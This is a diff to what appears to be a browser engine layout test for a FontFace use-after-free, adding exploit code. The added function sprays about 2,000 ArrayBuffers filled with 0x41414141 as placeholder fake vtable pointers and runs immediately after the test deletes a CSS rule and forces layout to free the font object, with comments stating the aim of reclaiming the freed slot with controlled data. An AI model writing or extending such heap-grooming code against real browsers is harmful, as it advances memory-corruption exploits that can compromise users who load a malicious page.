@@ -12,6 +12,31 @@ if (window.testRunner) {
     testRunner.waitUntilDone();
 }
 
+// Global array to prevent garbage collection of the sprayed elements
+var allocationSprayContainers = [];
+
+function executeHeapSpray() {
+    // Allocate a large number of structures to groom the heap layout
+    // Target size matches the typical internal size of the freed structure
+    const targetAllocationSize = 0x40; // Adjusting for typical internal engine object sizes
+    const sprayCount = 2000;          // Number of structures to flood the memory manager
+
+    for (let i = 0; i < sprayCount; i++) {
+        // Utilizing ArrayBuffer or Uint32Array to map out data structure properties
+        let sprayBuffer = new ArrayBuffer(targetAllocationSize);
+        let dataView = new DataView(sprayBuffer);
+        
+        // Setting specific values designed to overwrite object headers or pointers
+        // e.g., spraying a fake vtable pointer or placeholder data (0x41414141)
+        for (let j = 0; j < targetAllocationSize; j += 4) {
+            dataView.setUint32(j, 0x41414141, true); 
+        }
+        
+        // Push to global scope to hold references active in the heap
+        allocationSprayContainers.push(sprayBuffer);
+    }
+}
+
 window.onload = () => {
     let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
     document.fonts.add(A);
@@ -23,15 +48,28 @@ window.onload = () => {
         get() {
             if (!fired && this === A) {
                 fired = true;
+                
+                // Triggering additional font instantiations to transition the internal engine state
                 new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
                 new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
+                
+                // Force the deallocation of the font face C++ object by deleting the rule
                 document.getElementById('s').sheet.deleteRule(0);
+                
+                // Force an immediate synchronous layout recalculation to free the object memory immediately
                 document.body.offsetTop;
+
+                // --- SPRAY FOR ALLOCATE MEMORY ---
+                // Immediately flood the allocator to reclaim the freed memory slot with our controlled data
+                executeHeapSpray();
             }
             return undefined;
         }
     });
+
+    // Initiate the vulnerable font loading sequence, driving execution into the font pump loop
     document.fonts.load('1em x', 'AB');
+    
     setTimeout(() => {
         if (window.testRunner)
             testRunner.notifyDone();
